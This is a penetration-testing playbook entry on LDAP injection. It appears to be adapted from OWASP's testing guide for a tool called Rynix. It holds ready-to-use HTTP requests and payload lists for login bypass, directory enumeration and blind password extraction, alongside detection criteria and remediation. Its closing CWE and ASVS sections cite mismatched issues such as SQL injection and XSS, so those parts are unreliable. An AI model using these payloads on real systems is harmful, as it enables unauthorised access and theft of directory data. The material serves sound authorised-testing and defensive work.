---
id: WSTG-INPV-06
title: Testing for LDAP Injection
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
---

# WSTG-INPV-06: Testing for LDAP Injection

## Summary

LDAP Injection occurs when user-supplied input is incorporated into LDAP (Lightweight Directory Access Protocol) queries without proper sanitization. LDAP is commonly used for authentication, authorization, and directory lookups in enterprise environments (Active Directory, OpenLDAP). By injecting LDAP filter metacharacters, an attacker can modify the query logic to bypass authentication, enumerate directory entries, or extract sensitive information such as user attributes, group memberships, and organizational data.

## Test Objectives

- Identify parameters that are used in LDAP queries
- Test if LDAP metacharacters can alter query logic
- Determine if authentication can be bypassed via LDAP injection
- Assess the extent of information disclosure through LDAP enumeration

## Prerequisites

- Target application uses LDAP for authentication or directory lookups
- Docker pentest container capturing traffic
- Login forms or search features that query an LDAP directory
- Knowledge of common LDAP filter syntax

## Test Steps

### Step 1: Identify LDAP Query Injection Points

**CLI Actions:**
1. Use `curl` to identify login forms, user search, and directory lookup features
2. Use `curl` with pattern `(login|auth|search|lookup|directory|user|ldap)` to find relevant endpoints
3. Look for parameters that might be used in LDAP queries: username, email, cn, uid, group, department, ou
4. Use `save to manual-review file` for each candidate endpoint

### Step 2: Test for LDAP Injection with Metacharacters

**CLI Actions:**
Use `curl` to inject LDAP metacharacters into identified parameters:

**Test with wildcard:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=*&password=*
```

**Test with parentheses and filter operators:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(|(password=*)&password=anything
```

**Test with null byte:**
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%00&password=anything
```

If the application returns a different response (successful login, error message revealing LDAP structure), LDAP injection may be present.

### Step 3: Test Authentication Bypass

**CLI Actions:**
Use `curl` to attempt authentication bypass by manipulating LDAP filter logic:

If the backend constructs a filter like `(&(uid=USER)(userPassword=PASS))`:
```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=*)(uid=*))(|(uid=*&password=anything
```

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(&)&password=anything
```

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin)(|(password=*&password=anything
```

Use `curl --data-urlencode` to encode special characters when needed.

### Step 4: Test LDAP Enumeration via Search

**CLI Actions:**
If the application has a user/directory search feature, use `curl` to enumerate entries:

**Wildcard enumeration:**
```
GET /search?user=* HTTP/1.1
Host: target.com
```

**Attribute enumeration:**
```
GET /search?user=admin)(|(cn=* HTTP/1.1
Host: target.com
```

**Filter injection to extract attributes:**
```
GET /search?user=*)(mail=*@target.com HTTP/1.1
Host: target.com
```

### Step 5: Test Boolean-Based Blind LDAP Injection

**CLI Actions:**
Use `curl` to test blind injection by observing response differences:

**True condition (should return valid result):**
```
GET /search?user=admin)(|(uid=admin HTTP/1.1
Host: target.com
```

**False condition (should return empty/different result):**
```
GET /search?user=admin)(|(uid=nonexistent HTTP/1.1
Host: target.com
```

If responses differ, iterate character by character to extract data:
```
GET /search?user=admin)(|(password=a* HTTP/1.1
GET /search?user=admin)(|(password=b* HTTP/1.1
```

### Step 6: Test for Error-Based LDAP Injection

**CLI Actions:**
Use `curl` to trigger LDAP error messages:
```
GET /search?user=))(( HTTP/1.1
Host: target.com
```
```
GET /search?user=*))%00 HTTP/1.1
Host: target.com
```

Check if error messages reveal LDAP filter structure, directory base DN, or server information.

## Payloads

### Authentication Bypass Payloads
```
*
*)(&
*)(|(&
admin)(|(password=*)
admin)(&)
*)(uid=*))(|(uid=*
admin)(%26)
*))%00
)(cn=))(|(cn=
admin)(|(uid=*
```

### LDAP Filter Injection
```
)(uid=*
)(|(uid=*
*))(|(uid=*
*)(cn=*
)(mail=*
)(objectClass=*
)(userPassword=*
```

### Wildcard and Enumeration Payloads
```
*
a*
admin*
*admin*
*@target.com
)(cn=*)(
)(uid=a*
)(uid=b*
)(mail=*
```

### Blind LDAP Injection Payloads
```
admin)(|(password=a*
admin)(|(password=b*
admin)(|(description=*
*)(uid=admin)(|(uid=a*
```

### Error-Inducing Payloads
```
))
))(
(
)(
%00
\
*)(()))
(&(objectClass=*))
```

### Null Byte Payloads
```
admin%00
admin%00anything
*%00
admin)%00
```

## Detection Criteria

A finding should be logged when:
- LDAP metacharacters (*, ), (, |, &) cause different application behavior
- Authentication is bypassed using LDAP injection payloads
- Wildcard queries return directory entries that should be restricted
- Error messages reveal LDAP filter structure or directory information
- Boolean-based responses confirm LDAP query manipulation

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Authentication bypass via LDAP injection | High |
| Extraction of sensitive directory attributes (passwords, keys) | High |
| Enumeration of all users/groups in the directory | Medium |
| Blind LDAP injection confirmed with boolean responses | Medium |
| LDAP error messages reveal directory structure | Medium |
| Wildcard queries expand results but limited data exposure | Low |
| LDAP error messages revealed but no injection confirmed | Low |

## Remediation

- Sanitize all user input before incorporating into LDAP queries
- Escape LDAP special characters: `*`, `(`, `)`, `\`, `NUL`, `/`
- Use parameterized LDAP queries or prepared LDAP filter APIs
- Implement strict input validation with allowlists for expected characters
- Apply least-privilege LDAP bind accounts (no write access, limited read)
- Disable anonymous LDAP binds
- Implement rate limiting on directory search features
- Avoid displaying detailed LDAP error messages to users

## References

- [OWASP Testing Guide - LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection)
- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
- [CWE-90: Improper Neutralization of Special Elements used in an LDAP Query](https://cwe.mitre.org/data/definitions/90.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

